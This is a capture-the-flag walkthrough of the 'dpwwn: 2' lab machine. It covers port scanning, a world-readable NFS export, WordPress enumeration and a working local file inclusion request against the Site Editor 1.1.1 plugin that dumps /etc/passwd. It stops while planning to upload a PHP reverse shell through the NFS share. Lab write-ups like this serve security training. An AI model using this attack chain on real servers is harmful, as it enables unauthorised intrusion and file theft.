# dpwwn: 2

## 1.Enumeration
The ip address is `10.10.10.10`, let's scan it:

```bash
root@kali: nmap -v -p80,111,443,2049,33607,34141,47967,48661 -sC -sV -oN nmap.out 10.10.10.10

Nmap scan report for 10.10.10.10
Host is up (0.00041s latency).

PORT      STATE SERVICE  VERSION
80/tcp    open  http     Apache httpd 2.4.38 ((Ubuntu))
|_http-server-header: Apache/2.4.38 (Ubuntu)
|_http-title: dpwwn-02
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      45873/tcp6  mountd
|   100005  1,2,3      48661/tcp   mountd
|   100005  1,2,3      51220/udp   mountd
|   100005  1,2,3      52201/udp6  mountd
|   100021  1,3,4      34141/tcp   nlockmgr
|   100021  1,3,4      35639/tcp6  nlockmgr
|   100021  1,3,4      45437/udp6  nlockmgr
|   100021  1,3,4      55871/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
443/tcp   open  http     Apache httpd 2.4.38 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 (Ubuntu)
|_http-title: dpwwn-02
2049/tcp  open  nfs      3-4 (RPC #100003)
33607/tcp open  mountd   1-3 (RPC #100005)
34141/tcp open  nlockmgr 1-4 (RPC #100021)
47967/tcp open  mountd   1-3 (RPC #100005)
48661/tcp open  mountd   1-3 (RPC #100005)
```

i first start chekcing the nfs port and see the available shares:

```bash
root@kali: showmount -e 10.10.10.10

Export list for 10.10.10.10:
/home/dpwwn02 (everyone)
```

then mount it on the file system:

```bash
root@kali: mount -t nfs 10.10.10.10:/home/dpwwn02 /mnt/dpwwn
```

but it was empty and had nothing to check.

then i moved toward web on port 80 and start fuzzing the web application:

```bash
root@kali: gobuster dir --url http://10.10.10.10 --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/wordpress            (Status: 301) [Size: 237] [--> http://10.10.10.10/wordpress/]
```

then i used `wpscan` to check for users and plugins :

```bash
root@kali: wpscan --url http://10.10.10.10/wordpress -e u,p

[i] Plugin(s) Identified:

[+] site-editor
 | Location: http://10.10.10.10/wordpress/wp-content/plugins/site-editor/
 | Latest Version: 1.1.1 (up to date)
 | Last Updated: 2017-05-02T23:34:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.10.10/wordpress/wp-content/plugins/site-editor/readme.txt


[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```

it did not show any vulnerability in the plugin, but i searched it in searchsploit for version 1.1.1 :

```bash
root@kali: searchsploit site editor

WordPress Plugin Site Editor 1.1.1 - Local File Inclusion | php/webapps/44340.txt
```

and it says sending request to this path will include a local file :

```bash
root@kali: curl http://10.10.10.10/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:109::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
landscape:x:107:114::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:108:1::/var/cache/pollinate:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/sbin/nologin
rootadmin:x:1000:1000:rootadmin:/home/rootadmin:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
_rpc:x:109:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:110:65534::/var/lib/nfs:/usr/sbin/nologin
mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
```

now that we have LFI and access to nfs, we just can upload a php reverse shell on `/home/dpwwn02` on target machine and execute it with LFI :

```bash
root@kali: cd /mnt/dpwwn
touch shell.php

# use pentest monkey php reverse shell
```

